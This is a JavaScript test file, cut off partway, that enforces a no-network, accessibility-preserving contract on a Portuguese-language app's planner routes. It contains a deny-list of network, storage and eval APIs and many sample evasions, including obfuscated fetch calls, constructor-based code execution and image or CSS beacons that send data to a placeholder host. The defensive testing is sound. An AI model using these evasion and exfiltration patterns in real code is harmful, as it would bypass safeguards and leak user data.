import assert from "node:assert/strict";
import {
  mkdtemp,
  mkdir,
  readdir,
  readFile,
  rm,
  writeFile,
} from "node:fs/promises";
import { builtinModules } from "node:module";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

const testsDirectory = path.dirname(fileURLToPath(import.meta.url));
const ajudaDirectory = path.resolve(testsDirectory, "../app/ajuda");
const foundationPath = path.resolve(
  testsDirectory,
  "../components/local-planner-shell.tsx",
);
const foundationStylesPath = path.resolve(
  testsDirectory,
  "../components/local-planner-shell.module.css",
);

async function discoverPlannerRoutes(root = ajudaDirectory) {
  const routes = [];

  async function visit(directory, relativeDirectory = "") {
    let entries;

    try {
      entries = await readdir(directory, { withFileTypes: true });
    } catch (error) {
      if (error?.code === "ENOENT" && directory === root) {
        return;
      }

      throw error;
    }

    entries.sort((left, right) => left.name.localeCompare(right.name));

    for (const entry of entries) {
      if (!entry.isDirectory()) {
        continue;
      }

      const relativeName = joinRelativeSourcePath(relativeDirectory, entry.name);
      if (entry.name.startsWith("planejar-")) {
        routes.push(relativeName);
        continue;
      }

      await visit(path.join(directory, entry.name), relativeName);
    }
  }

  await visit(root);
  return routes.sort();
}

function joinRelativeSourcePath(directory, name) {
  return path.posix.join(directory, name);
}

async function collectRouteSources(directory, relativeDirectory = "") {
  const entries = (await readdir(directory, { withFileTypes: true })).sort(
    (left, right) => left.name.localeCompare(right.name),
  );
  const files = [];

  for (const entry of entries) {
    const relativeName = joinRelativeSourcePath(relativeDirectory, entry.name);
    const absoluteName = path.join(directory, entry.name);

    if (entry.isDirectory()) {
      files.push(...(await collectRouteSources(absoluteName, relativeName)));
      continue;
    }

    if (entry.isFile() && /\.(?:css|ts|tsx)$/.test(entry.name)) {
      files.push({
        name: relativeName,
        source: await readFile(absoluteName, "utf8"),
      });
    }
  }

  return files;
}

async function readRouteSources(route, root = ajudaDirectory) {
  return collectRouteSources(path.join(root, route));
}

function blank(character) {
  return character === "\n" || character === "\r" ? character : " ";
}

function startsRegexLiteral(source, index) {
  let previous = index - 1;
  while (previous >= 0 && /\s/.test(source[previous])) {
    previous -= 1;
  }

  if (previous < 0) {
    return true;
  }

  if (
    (source[previous] === "+" || source[previous] === "-") &&
    previous > 0 &&
    source[previous - 1] === source[previous]
  ) {
    return false;
  }

  if (/[([{=,:;!?&|+\-*%^~]/.test(source[previous])) {
    return true;
  }

  if (source[previous] === ">") {
    return previous > 0 && source[previous - 1] === "=";
  }

  if (source[previous] === "<") {
    return false;
  }

  const prefix = source.slice(0, previous + 1);
  const keyword = prefix.match(/([A-Za-z_$][\w$]*)$/)?.[1];
  return /^(?:await|case|delete|do|else|in|instanceof|new|of|return|throw|typeof|void|yield)$/.test(
    keyword ?? "",
  );
}

function analyzeSource(source) {
  const active = source.split("");
  const executable = source.split("");
  const stack = [{ type: "code", templateExpression: false, braceDepth: 0 }];
  let index = 0;

  const mask = (target, position) => {
    target[position] = blank(source[position]);
  };

  while (index < source.length) {
    const state = stack.at(-1);

    if (state.type === "template") {
      if (source[index] === "\\") {
        mask(executable, index);
        if (index + 1 < source.length) {
          mask(executable, index + 1);
        }
        index += 2;
        continue;
      }

      if (source[index] === "`") {
        mask(executable, index);
        stack.pop();
        index += 1;
        continue;
      }

      if (source[index] === "$" && source[index + 1] === "{") {
        mask(executable, index);
        mask(executable, index + 1);
        stack.push({ type: "code", templateExpression: true, braceDepth: 0 });
        index += 2;
        continue;
      }

      mask(executable, index);
      index += 1;
      continue;
    }

    if (state.templateExpression && source[index] === "}") {
      if (state.braceDepth === 0) {
        mask(executable, index);
        stack.pop();
        index += 1;
        continue;
      }

      state.braceDepth -= 1;
      index += 1;
      continue;
    }

    if (state.templateExpression && source[index] === "{") {
      state.braceDepth += 1;
      index += 1;
      continue;
    }

    if (source[index] === "/" && source[index + 1] === "/") {
      const prefix = source.slice(Math.max(0, index - 6), index);
      const isUrlText = /https?:$/.test(prefix);

      if (!isUrlText) {
        while (index < source.length && source[index] !== "\n") {
          mask(active, index);
          mask(executable, index);
          index += 1;
        }
        continue;
      }
    }

    if (source[index] === "/" && source[index + 1] === "*") {
      mask(active, index);
      mask(executable, index);
      mask(active, index + 1);
      mask(executable, index + 1);
      index += 2;

      while (index < source.length) {
        if (source[index] === "*" && source[index + 1] === "/") {
          mask(active, index);
          mask(executable, index);
          mask(active, index + 1);
          mask(executable, index + 1);
          index += 2;
          break;
        }

        mask(active, index);
        mask(executable, index);
        index += 1;
      }
      continue;
    }

    if (source[index] === "/" && startsRegexLiteral(source, index)) {
      let insideCharacterClass = false;
      mask(executable, index);
      index += 1;

      while (index < source.length) {
        mask(executable, index);

        if (source[index] === "\\") {
          if (index + 1 < source.length) {
            mask(executable, index + 1);
          }
          index += 2;
          continue;
        }

        if (source[index] === "[") {
          insideCharacterClass = true;
        } else if (source[index] === "]") {
          insideCharacterClass = false;
        } else if (source[index] === "/" && !insideCharacterClass) {
          index += 1;
          while (index < source.length && /[A-Za-z]/.test(source[index])) {
            mask(executable, index);
            index += 1;
          }
          break;
        }

        index += 1;
      }
      continue;
    }

    if (source[index] === "'" || source[index] === '"') {
      const quote = source[index];
      mask(executable, index);
      index += 1;

      while (index < source.length) {
        mask(executable, index);

        if (source[index] === "\\") {
          if (index + 1 < source.length) {
            mask(executable, index + 1);
          }
          index += 2;
          continue;
        }

        const current = source[index];
        index += 1;
        if (current === quote) {
          break;
        }
      }
      continue;
    }

    if (source[index] === "`") {
      mask(executable, index);
      stack.push({ type: "template" });
      index += 1;
      continue;
    }

    index += 1;
  }

  return {
    active: active.join(""),
    executable: executable.join(""),
  };
}

const sourceAnalysisCache = new Map();
const forbiddenNodeModules = new Set(
  builtinModules.flatMap((moduleName) => [moduleName, `node:${moduleName}`]),
);

function getSourceAnalysis(source) {
  let analyzed = sourceAnalysisCache.get(source);

  if (!analyzed) {
    analyzed = analyzeSource(source);
    sourceAnalysisCache.set(source, analyzed);
  }

  return analyzed;
}

function maskJsxTextNodes(source) {
  const masked = source.split("");
  let mode = "code";
  let jsxDepth = 0;
  let expressionDepth = 0;
  let expressionReturnMode = "code";
  let closingTag = false;
  let selfClosingTag = false;

  const previousCodeToken = (index) => {
    let previous = index - 1;
    while (previous >= 0 && /\s/.test(source[previous])) {
      previous -= 1;
    }
    return previous;
  };

  const startsJsxElement = (index) => {
    if (!/[A-Za-z>/]/.test(source[index + 1] ?? "")) {
      return false;
    }

    let genericEnd = index + 1;
    let genericDepth = 1;
    while (genericEnd < source.length && genericEnd - index <= 500) {
      if (source[genericEnd] === "<") {
        genericDepth += 1;
      } else if (source[genericEnd] === ">") {
        genericDepth -= 1;
        if (genericDepth === 0) {
          break;
        }
      }
      genericEnd += 1;
    }

    if (genericDepth === 0) {
      let parametersStart = genericEnd + 1;
      while (/\s/.test(source[parametersStart] ?? "")) {
        parametersStart += 1;
      }

      if (source[parametersStart] === "(") {
        let parametersEnd = parametersStart + 1;
        let parameterDepth = 1;
        while (parametersEnd < source.length && parameterDepth > 0) {
          if (source[parametersEnd] === "(") {
            parameterDepth += 1;
          } else if (source[parametersEnd] === ")") {
            parameterDepth -= 1;
          }
          parametersEnd += 1;
        }

        while (/\s/.test(source[parametersEnd] ?? "")) {
          parametersEnd += 1;
        }
        const afterParameters = source.slice(parametersEnd, parametersEnd + 500);
        if (
          afterParameters.startsWith("=>") ||
          /^:\s*[^;=]+=>/.test(afterParameters)
        ) {
          return false;
        }
      }
    }

    const previous = previousCodeToken(index);
    if (previous < 0 || /[=(:,[!&|?{};]/.test(source[previous])) {
      return true;
    }

    return /\breturn\s*$/.test(source.slice(0, index));
  };

  for (let index = 0; index < source.length; index += 1) {
    const character = source[index];

    if (mode === "code") {
      if (character === "<" && startsJsxElement(index)) {
        mode = "tag";
        closingTag = source[index + 1] === "/";
        selfClosingTag = false;
      }
      continue;
    }

    if (mode === "tag") {
      if (character === "{") {
        expressionReturnMode = "tag";
        mode = "expression";
        expressionDepth = 1;
        continue;
      }

      if (character === "/" && source[index + 1] === ">") {
        selfClosingTag = true;
        continue;
      }

      if (character === ">") {
        if (closingTag) {
          jsxDepth -= 1;
        } else if (!selfClosingTag) {
          jsxDepth += 1;
        }

        mode = jsxDepth > 0 ? "text" : "code";
      }
      continue;
    }

    if (mode === "expression") {
      if (character === "{") {
        expressionDepth += 1;
      } else if (character === "}") {
        expressionDepth -= 1;
        if (expressionDepth === 0) {
          mode = expressionReturnMode;
        }
      }
      continue;
    }

    if (character === "<") {
      mode = "tag";
      closingTag = source[index + 1] === "/";
      selfClosingTag = false;
      continue;
    }

    if (character === "{") {
      expressionReturnMode = "text";
      mode = "expression";
      expressionDepth = 1;
      continue;
    }

    masked[index] = blank(character);
  }

  return masked.join("");
}

function matchesAtExecutableToken(analyzed, tokenPattern, activePattern) {
  for (const match of analyzed.executable.matchAll(tokenPattern)) {
    if (activePattern.test(analyzed.active.slice(match.index))) {
      return true;
    }
  }

  return false;
}

function listStaticModuleSpecifiers(source) {
  const analyzed = getSourceAnalysis(source);
  const specifiers = [];

  for (const match of analyzed.executable.matchAll(/\b(?:import|export)\b/g)) {
    const statement = analyzed.active.slice(match.index);
    const parsed =
      statement.match(
        /^import\s+(?:type\s+)?(?:[^;"']*?\s+from\s+)?["']([^"']+)["']/,
      ) ??
      statement.match(
        /^export\s+(?:type\s+)?[^;"']*?\s+from\s+["']([^"']+)["']/,
      );

    if (parsed) {
      specifiers.push(parsed[1]);
    }
  }

  return specifiers;
}

function isAllowedLocalModule(name, specifier) {
  if (
    /^@\/components(?:\/(?:local-planner-shell|local-planner-choice-group)(?:\.tsx?)?)?\/?$/.test(
      specifier,
    )
  ) {
    return true;
  }

  if (!specifier.startsWith(".")) {
    return !/^(?:@\/|~\/|\/)/.test(specifier);
  }

  const resolved = path.posix.normalize(
    path.posix.join(path.posix.dirname(name), specifier),
  );
  return resolved !== ".." && !resolved.startsWith("../");
}

function loadsExternalJsxResource(source) {
  const executable = getSourceAnalysis(source).executable;
  const resourceTag = /<(?:audio|embed|iframe|img|link|object|script|source|track|video)\b/gi;

  for (const match of executable.matchAll(resourceTag)) {
    let expressionDepth = 0;
    let tagEnd = -1;

    for (let index = match.index; index < executable.length; index += 1) {
      if (executable[index] === "{") {
        expressionDepth += 1;
      } else if (executable[index] === "}") {
        expressionDepth = Math.max(0, expressionDepth - 1);
      } else if (executable[index] === ">" && expressionDepth === 0) {
        tagEnd = index;
        break;
      }
    }

    if (tagEnd === -1) {
      return true;
    }

    const tag = source.slice(match.index, tagEnd + 1);
    const executableTag = executable.slice(match.index, tagEnd + 1);
    const resourceAttribute = /\b(?:data|href|poster|src)\s*=/gi;

    for (const attribute of executableTag.matchAll(resourceAttribute)) {
      let valueStart = attribute.index + attribute[0].length;
      while (/\s/.test(tag[valueStart] ?? "")) {
        valueStart += 1;
      }

      const delimiter = tag[valueStart];
      let valueEnd = valueStart;

      // Expressions can hide remote URLs behind concatenation, variables, or
      // helper calls. Resource-bearing tags are static and local by contract.
      if (delimiter === "{") {
        return true;
      }

      if (delimiter === '"' || delimiter === "'" || delimiter === "`") {
        valueEnd += 1;
        while (valueEnd < tag.length) {
          if (tag[valueEnd] === "\\") {
            valueEnd += 2;
            continue;
          }
          if (tag[valueEnd] === delimiter) {
            valueEnd += 1;
            break;
          }
          valueEnd += 1;
        }
      } else if (delimiter === "{") {
        let depth = 0;
        while (valueEnd < executableTag.length) {
          if (executableTag[valueEnd] === "{") {
            depth += 1;
          } else if (executableTag[valueEnd] === "}") {
            depth -= 1;
            if (depth === 0) {
              valueEnd += 1;
              break;
            }
          }
          valueEnd += 1;
        }
      } else {
        while (valueEnd < tag.length && !/[\s>]/.test(tag[valueEnd])) {
          valueEnd += 1;
        }
      }

      const candidate = tag.slice(valueStart, valueEnd);

      if (/(?:^|["'`])\s*(?:https?:)?\/\//i.test(candidate)) {
        return true;
      }
    }
  }

  return false;
}

function loadsExternalCssResource(source) {
  const analyzed = getSourceAnalysis(source);
  const cssProperty =
    /\b(?:background|backgroundImage|borderImage|borderImageSource|content|cursor|listStyle|listStyleImage|mask|maskImage|src)\s*:/g;
  const externalUrl = /\burl\s*\(\s*["'`]?(?:https?:)?\/\//i;

  for (const match of analyzed.executable.matchAll(cssProperty)) {
    const declaration = analyzed.active
      .slice(match.index, match.index + 1000)
      .split(/[;,}]/, 1)[0];
    if (
      externalUrl.test(declaration) ||
      (/\burl\s*\(/i.test(declaration) &&
        (declaration.includes("+") || declaration.includes("\${")))
    ) {
      return true;
    }
  }

  for (const match of analyzed.executable.matchAll(/<style\b/gi)) {
    const styleEnd = analyzed.executable.indexOf("</style>", match.index);
    const candidate = analyzed.active.slice(
      match.index,
      styleEnd === -1 ? undefined : styleEnd + "</style>".length,
    );
    if (externalUrl.test(candidate)) {
      return true;
    }
  }

  return false;
}

function loadsExternalCssStylesheet(source) {
  const active = source.replace(/\/\*[\s\S]*?\*\//g, " ");

  // CSS escapes can reconstruct protocols or url() identifiers. Supporting
  // them safely needs a CSS parser, so this Node-native contract rejects them.
  if (/\\(?:[0-9a-f]{1,6}\s?|.)/i.test(active)) {
    return true;
  }

  const isLocalReference = (candidate) => {
    const value = candidate.trim().replace(/^(["'])([\s\S]*)\1$/, "$2").trim();
    return /^(?:\/(?!\/)|\.\.?\/|#|data:)/i.test(value);
  };

  for (const match of active.matchAll(/\burl\s*\(([^)]*)\)/gi)) {
    if (!isLocalReference(match[1])) {
      return true;
    }
  }

  for (const match of active.matchAll(/@import\s+([^;{}]+)/gi)) {
    const candidate = match[1].trim();
    const imported =
      candidate.match(/^url\s*\(([^)]*)\)/i)?.[1] ??
      candidate.match(/^(["'][^"']*["'])/)?.[1];
    if (!imported || !isLocalReference(imported)) {
      return true;
    }
  }

  return false;
}

function fail(route, contract) {
  assert.fail(`${route}: ${contract}`);
}

function assertNoExternalEffects(route, files) {
  const forbidden = [
    ["executable", /\b(?:fetch|XMLHttpRequest|WebSocket|EventSource)\b/i, "não pode usar cliente de rede ou fetch"],
    ["executable", /\b(?:location|cookieStore|addEventListener)\b/, "não pode usar API global de navegação ou exfiltração"],
    ["executable", /(?<![.\w$])open\s*\(/, "não pode chamar a função global open"],
    ["executable", /\bnew\s+(?:Image|Audio)\b/, "não pode instanciar recurso global de mídia"],
    ["executable", /\b(?:setTimeout|setInterval|Worker|SharedWorker|process|require)\b/, "não pode executar código indireto ou acessar runtime externo"],
    ["executable", /\b(?:localStorage|sessionStorage|indexedDB)\b/i, "não pode acessar armazenamento"],
    ["executable", /\bdocument\b/i, "não pode acessar nem criar alias do objeto document"],
    ["executable", /\bnavigator\b/i, "não pode acessar nem criar alias do objeto navigator"],
    ["executable", /\b(?:window|globalThis|self|global)\b/, "não pode acessar ou criar alias de objeto global"],
    ["executable", /(?<![.\w$])(?:top|parent|frames)\b/, "não pode acessar ou criar alias de objeto global alternativo"],
    ["executable", /\bReflect\b/, "não pode usar ou criar alias de Reflect"],
    ["executable", /\b(?:eval|Function|constructor)\b/, "não pode executar código dinâmico"],
    ["executable", /\\(?:u(?:[0-9a-fA-F]{4}|\{[0-9a-fA-F]+\})|x[0-9a-fA-F]{2})/, "não pode usar escape Unicode ou hexadecimal em código executável"],
    ["executable", /\b(?:fromCharCode|fromCodePoint|atob|btoa)\b/, "não pode reconstruir identificadores dinamicamente"],
    ["executable", /\b(?:click|submit)\s*\(/, "não pode simular clique ou submissão programática"],
    ["executable", /\bimport\s*\(/, "não pode usar importação dinâmica"],
    ["executable", /\brequire\s*\(/, "não pode usar carregamento dinâmico"],
  ];

  for (const { name, source } of files) {
    if (name.endsWith(".css")) {
      if (loadsExternalCssStylesheet(source)) {
        fail(route, `${name} não pode carregar recurso externo por CSS`);
      }
      continue;
    }

    const analyzed = getSourceAnalysis(source);
    const views = {
      ...analyzed,
      executable: maskJsxTextNodes(analyzed.executable),
    };

    for (const [view, pattern, message] of forbidden) {
      if (pattern.test(views[view])) {
        fail(route, `${name} ${message}`);
      }
    }

    for (const specifier of listStaticModuleSpecifiers(source)) {
      if (
        forbiddenNodeModules.has(specifier) ||
        /^(?:axios|node-fetch|undici)$/.test(specifier)
      ) {
        fail(route, `${name} não pode importar módulo com efeito externo`);
      }

      if (!isAllowedLocalModule(name, specifier)) {
        fail(route, `${name} não pode importar código local fora do planejador`);
      }
    }

    const accessesDynamicConstructor = matchesAtExecutableToken(
      analyzed,
      /\.|\[/g,
      /^(?:\.\s*constructor\b|\[\s*["']constructor["']\s*\])/,
    );
    if (accessesDynamicConstructor) {
      fail(route, `${name} não pode acessar constructor para executar código dinâmico`);
    }

    if (loadsExternalJsxResource(source)) {
      fail(route, `${name} não pode carregar recurso externo por JSX`);
    }

    if (loadsExternalCssResource(source)) {
      fail(route, `${name} não pode carregar recurso externo por CSS`);
    }
  }
}

function combineActiveSources(files) {
  return files.map(({ source }) => getSourceAnalysis(source).active).join("\n");
}

function combineExecutableSources(files) {
  return files.map(({ source }) => getSourceAnalysis(source).executable).join("\n");
}

function assertUsesFoundation(route, files) {
  const combined = combineActiveSources(files);
  const executable = combineExecutableSources(files);
  const importsPlannerFoundation = files.some(({ source }) => {
    const analyzed = getSourceAnalysis(source);
    return matchesAtExecutableToken(
      analyzed,
      /\bimport\b/g,
      /^import\s+\{\s*(?:[^}]*,\s*)?LocalPlannerShell\s*(?:,[^}]*)?\}\s+from\s+["'](?:[^"']*\/)?components(?:\/local-planner-shell(?:\.tsx?)?)?\/?["']/,
    );
  });

  if (!importsPlannerFoundation || !/<LocalPlannerShell\b/.test(executable)) {
    fail(route, "deve importar e renderizar LocalPlannerShell");
  }

  const exposesResult =
    /<LocalPlannerSummary\b|\bLocalPlannerState\b/.test(executable) ||
    /role=["']status["']|data-state=/.test(combined);

  if (exposesResult && !/<LocalPlannerSummary\b/.test(executable)) {
    fail(route, "deve reutilizar LocalPlannerSummary ao comunicar um resultado");
  }

  const implementsNativeChoices =
    /<fieldset\b/.test(executable) ||
    /type=["'](?:radio|checkbox)["']/.test(combined);

  if (
    implementsNativeChoices &&
    (!/local-planner-choice-group/.test(combined) ||
      !/<LocalPlannerChoiceGroup\b/.test(executable))
  ) {
    fail(route, "deve reutilizar LocalPlannerChoiceGroup ao oferecer escolhas");
  }
}

function assertPreservesSemantics(route, files) {
  const combined = combineExecutableSources(files);

  if (/<main\b/.test(combined)) {
    fail(route, "não deve criar um segundo main fora de LocalPlannerShell");
  }

  if (/<h1\b/.test(combined)) {
    fail(route, "não deve criar um segundo h1 fora de LocalPlannerShell");
  }

  if (/style=\{\{[^}]*\b(?:color|backgroundColor)\s*:/.test(combined)) {
    fail(route, "não deve comunicar estado por cor inline");
  }
}

function assertFoundationAccessibilitySources(foundationSource, stylesSource) {
  const foundation = getSourceAnalysis(foundationSource).active;
  const styles = getSourceAnalysis(stylesSource).active;

  assert.match(foundation, /role=["']status["']/, 'A fundação (LocalPlannerSummary) deve conter role="status"');
  assert.match(foundation, /aria-live=["']polite["']/, 'A fundação (LocalPlannerSummary) deve conter aria-live="polite"');
  assert.match(foundation, /summaryIcons/, "A fundação (LocalPlannerSummary) deve utilizar summaryIcons");
  assert.match(styles, /min-height:\s*(?:44px|2\.75rem)/, "Estilos devem definir alvo mínimo de 44px ou 2.75rem");
  assert.match(styles, /:focus-(?:visible|within)/, "Estilos devem preservar foco visível");
  assert.match(styles, /outline(?:-width)?:\s*(?:3px|0\.1875rem)/, "Estilos devem definir outline de foco de 3px ou 0.1875rem");
  assert.match(styles, /@media\s*\(\s*(?:max-width\s*:\s*360px|width\s*<=\s*360px)\s*\)/, "Estilos devem tratar reflow em 360px");
  assert.match(styles, /overflow-wrap:\s*anywhere/, "Estilos devem evitar estouro de texto");
  assert.match(styles, /@media\s*\(\s*forced-colors\s*:\s*active\s*\)/, "Estilos devem tratar cores forçadas");
}

async function assertFoundationAccessibilityContract() {
  const [foundation, styles] = await Promise.all([
    readFile(foundationPath, "utf8"),
    readFile(foundationStylesPath, "utf8"),
  ]);

  assertFoundationAccessibilitySources(foundation, styles);
}

test("planejadores públicos reutilizam a fundação local segura", async (t) => {
  await assertFoundationAccessibilityContract();
  const routes = await discoverPlannerRoutes();

  for (const route of routes) {
    await t.test(route, async () => {
      const files = await readRouteSources(route);

      if (!files.some(({ name }) => /\.(?:ts|tsx)$/.test(name))) {
        fail(route, "não possui fonte TypeScript para validar");
      }

      assertUsesFoundation(route, files);
      assertNoExternalEffects(route, files);
      assertPreservesSemantics(route, files);
    });
  }
});

test("descoberta é determinística, recursiva e aceita árvore vazia", async (t) => {
  const temporaryRoot = await mkdtemp(path.join(os.tmpdir(), "evolvia-planner-"));

  try {
    assert.deepEqual(await discoverPlannerRoutes(temporaryRoot), []);

    const routeDirectory = path.join(temporaryRoot, "planejar-fixture");
    const nestedDirectory = path.join(routeDirectory, "components");
    const groupedRouteDirectory = path.join(
      temporaryRoot,
      "(categoria)",
      "planejar-aninhado",
    );
    await mkdir(nestedDirectory, { recursive: true });
    await mkdir(groupedRouteDirectory, { recursive: true });
    await writeFile(path.join(routeDirectory, "page.tsx"), "export default null;\n");
    await writeFile(path.join(nestedDirectory, "form.tsx"), "export const nested = true;\n");
    await writeFile(
      path.join(nestedDirectory, "form.module.css"),
      ".fixture { background: url('/marca.svg'); }\n",
    );
    await writeFile(
      path.join(groupedRouteDirectory, "page.tsx"),
      "export default null;\n",
    );

    assert.deepEqual(await discoverPlannerRoutes(temporaryRoot), [
      "(categoria)/planejar-aninhado",
      "planejar-fixture",
    ]);
    assert.deepEqual(
      (await readRouteSources("planejar-fixture", temporaryRoot)).map(
        ({ name }) => name,
      ),
      ["components/form.module.css", "components/form.tsx", "page.tsx"],
    );
    assert.equal(joinRelativeSourcePath("components", "form.tsx"), "components/form.tsx");
  } finally {
    await rm(temporaryRoot, { recursive: true, force: true });
  }

  await t.test("guardas falham diante de efeitos externos e evasões", () => {
    const evasions = [
      "globalThis['fetch']('/api')",
      "window['local' + 'Storage']",
      "document['cookie'] = 'x'",
      "Reflect.construct(WebSocket, ['wss://example.invalid'])",
      "import('node-fetch')",
      "const { fetch: f } = globalThis; f('/api');",
      "const f = self.fetch; f('/api');",
      "const f = global.fetch; f('/api');",
      "const f = globalThis['fe' + 'tch']; f('/api');",
      "const { ['fe' + 'tch']: f } = globalThis; f('/api');",
      "const browserGlobal = globalThis; browserGlobal['fe' + 'tch']('/api');",
      "Reflect.get(globalThis, 'fetch')('/api');",
      "Reflect['get'](globalThis, 'fetch')('/api');",
      "const reflection = Reflect; reflection.get(globalThis, 'fetch')('/api');",
      "const g = [globalThis][0]; const f = g.fetch; f('/api');",
      "const ctx = { g: globalThis }; ctx.g.fetch('/api');",
      "import axios from 'axios';",
      "import 'node:https';",
      "eval('fe' + 'tch(\"/api\")');",
      "Function('return fetch(\"/api\")')();",
      "new Function('return fetch(\"/api\")')();",
      "(() => {})['constructor']('return fetch(\"/api\")')()",
      "(() => {}).constructor('return fetch(\"/api\")')()",
      "const { constructor: c } = () => {}; c('return fetch(\"/api\")')();",
      "const { cookie } = document;",
      "const { sendBeacon } = navigator;",
      "top['fe' + 'tch']('/api');",
      "parent.fetch('/api');",
      "frames[0].fetch('/api');",
      "gl\\u006fbalThis.fetch('/api');",
      "String.fromCharCode(102, 101, 116, 99, 104);",
      "atob('ZmV0Y2g=');",
      "new Image().src = '/coleta';",
      "new Audio('/coleta');",
      "location.href = '/coleta';",
      "cookieStore.get('sessao');",
      "open('/coleta');",
      "addEventListener('message', function () { this['fe' + 'tch']('/api'); });",
      '<img src="https://example.invalid/coleta" />',
      '<iframe src="//example.invalid/coleta" />',
      '<img src={"https://example.invalid/coleta"} />',
      '<img src={"https:" + "/" + "/example.invalid/coleta"} />',
      '<img src={assetPath} alt="" />',
      "<link href={condition ? '/local.css' : '//example.invalid/coleta.css'} />",
      "<img src={() => 'https://example.invalid/coleta'} />",
      "setTimeout('fetch(\\\"/api\\\")', 1);",
      "setInterval('fetch(\\\"/api\\\")', 1);",
      "new Worker('/worker.js');",
      "new SharedWorker('/worker.js');",
      "const req = process.mainModule.require; req('node:https');",
      "const req = module.require; req('node:https');",
      '<button alt=">" onClick={() => fetch("/api")}>Abrir</button>',
      '<button aria-label={label} onClick={() => fetch("/api")}>Abrir</button>',
      "import net from 'node:net';",
      "import { exec } from 'child_process';",
      "import { fetcher } from '@/lib/fetcher';",
      "export { fetcher } from '../../lib/fetcher';",
      "const identity = <T>(arg: T) => fetch('/api');",
      "const identity = <T,>(arg: T) => fetch('/api');",
      "const identity = <T extends Record<string, unknown>>(arg: T): Promise<T> => fetch('/api');",
      "const style = { backgroundImage: `url('https://example.invalid/coleta?data=${sensitiveData}')` };",
      "const style = { backgroundImage: 'url(' + 'https:' + '/' + '/example.invalid)' };",
      "ref.current?.click();",
      "formRef.current?.submit();",
      "const { click } = ref.current; click();",
    ];

    for (const [index, source] of evasions.entries()) {
      assert.throws(
        () =>
          assertNoExternalEffects("planejar-fixture", [
            { name: `fixture-${index}.tsx`, source },
          ]),
        /planejar-fixture/,
      );
    }
  });

  await t.test("comentários e literais legítimos não violam o contrato", () => {
    const legitimateReferences = [
      "const cookieMessage = 'Este planejador não utiliza document.cookie ou fetch.';",
      "const endpointExample = 'https://example.invalid/path';",
      "const template = `Não usamos fetch nem localStorage.`;",
      "const regexCommentMarkers = /[/*]/;",
      "const doubleSlashRegex = /[/][/]/;",
      "const importExample = 'import axios from node-fetch';",
      "type BrowserDocument = { title: string };",
      "// Não usar fetch(), document.cookie ou localStorage aqui.",
      "/* globalThis['fetch']; <main><h1>exemplo</h1></main> */",
      "const constructorMessage = 'A propriedade constructor não é usada.';",
      "const example = \"fn['constructor'] não deve executar\";",
      'const markupExample = \'<img src="https://example.invalid/coleta" />\';',
      '<a href="/eventos">Eventos</a>',
      '<img src="/marca.svg" alt="" />',
      '<img src="/marca.svg" alt="Veja https://example.invalid" />',
      "import { helper } from './components/helper';",
      "import { LocalPlannerShell } from '@/components';",
      "import { LocalPlannerChoiceGroup } from '@/components/local-planner-choice-group';",
      "import Image from 'next/image'; const view = <Image src='/marca.svg' alt='' />;",
      "const f = () => {}; /fetch/.test(copy);",
      '<button alt=">" aria-label={label} data-kind={kind}>Abrir</button>',
      '<button onClick={handleClick} onSubmit={handleSubmit}>Continuar</button>',
      "const submit = () => true; const open = false; const Audio = 'legenda';",
      "const localStyle = { backgroundImage: \"url('/marca.svg')\" };",
      "const cssDocumentation = \"Exemplo textual: backgroundImage: url('https://example.invalid')\";",
      "<p>Este planejador não usa fetch, location ou document.</p>",
      "<div>https://example.invalid/fetch</div>",
    ];

    for (const [index, source] of legitimateReferences.entries()) {
      assert.doesNotThrow(() =>
        assertNoExternalEffects("planejar-fixture", [
          { name: `legitimate-${index}.tsx`, source },
        ]),
      );
    }

    const stylesheetEvasions = [
      ".hero { background-image: url('https://example.invalid/coleta'); }",
      ".hero { background: url(//example.invalid/coleta); }",
      "@import 'https://example.invalid/theme.css';",
      ".hero { background: u\\72l('https://example.invalid/coleta'); }",
    ];
    for (const [index, source] of stylesheetEvasions.entries()) {
      assert.throws(
        () =>
          assertNoExternalEffects("planejar-fixture", [
            { name: `fixture-${index}.module.css`, source },
          ]),
        /planejar-fixture/,
      );
    }

    assert.doesNotThrow(() =>
      assertNoExternalEffects("planejar-fixture", [
        {
          name: "local.module.css",
          source:
            "/* https://example.invalid não é carregado */ .hero { background: url('/marca.svg'); } @import './tokens.css';",
        },
      ]),
    );

    assert.doesNotThrow(() =>
      assertFoundationAccessibilitySources(
        "<div role='status' aria-live='polite'>{summaryIcons}</div>",
        ".choice { min-height: 2.75rem; } :focus-visible { outline-width: 0.1875rem; } @media(width <= 360px) { overflow-wrap: anywhere; } @media ( forced-colors : active ) {}",
      ),
    );

    const analyzedTemplate = analyzeSource("`texto ${fetch('/api')}`");
    assert.match(analyzedTemplate.executable, /fetch\s*\(/);

    const analyzedRegex = analyzeSource("const marker = /[/*]/; const active = true;");
    assert.match(analyzedRegex.executable, /const active = true/);

    const analyzedJsxPath = analyzeSource(
      "const view = <div>/ajuda</div>; const active = true;",
    );
    assert.match(analyzedJsxPath.executable, /const active = true/);

    const analyzedJsxUrl = analyzeSource(
      "const view = <div>https://example.invalid</div>; fetch('/api');",
    );
    assert.match(analyzedJsxUrl.executable, /fetch\s*\(/);
    assert.throws(
      () =>
        assertNoExternalEffects("planejar-fixture", [
          { name: "jsx-url-bypass.tsx", source: "return <div>https://</div>; fetch('/api');" },
        ]),
      /planejar-fixture/,
    );
    assert.throws(
      () =>
        assertNoExternalEffects("planejar-fixture", [
          { name: "jsx-expression-bypass.tsx", source: "return <div>{fetch('/api')}</div>;" },
        ]),
      /planejar-fixture/,
    );
    assert.doesNotThrow(() =>
      assertNoExternalEffects("planejar-fixture", [
        {
          name: "jsx-copy.tsx",
          source: "<div><p>Este planejador não usa fetch.</p><p>https://example.invalid/location</p></div>",
        },
      ]),
    );

    const analyzedArrowRegex = analyzeSource(
      "const matcher = () => /ajuda/.test(pathname); const active = true;",
    );
    assert.match(analyzedArrowRegex.executable, /const active = true/);

    const analyzedPostfixDivision = analyzeSource(
      "let total = 4; const half = total++ / 2; const active = true;",
    );
    assert.match(analyzedPostfixDivision.executable, /const active = true/);
  });

  await t.test("comentários não satisfazem nem quebram contratos estruturais", () => {
    const commentedFoundation = [{
      name: "page.tsx",
      source: '// import { LocalPlannerShell } from "@/components/local-planner-shell";\n// <LocalPlannerShell />',
    }];
    assert.throws(
      () => assertUsesFoundation("planejar-fixture", commentedFoundation),
      /deve importar e renderizar LocalPlannerShell/,
    );

    assert.throws(
      () => assertUsesFoundation("planejar-fixture", [{
        name: "page.tsx",
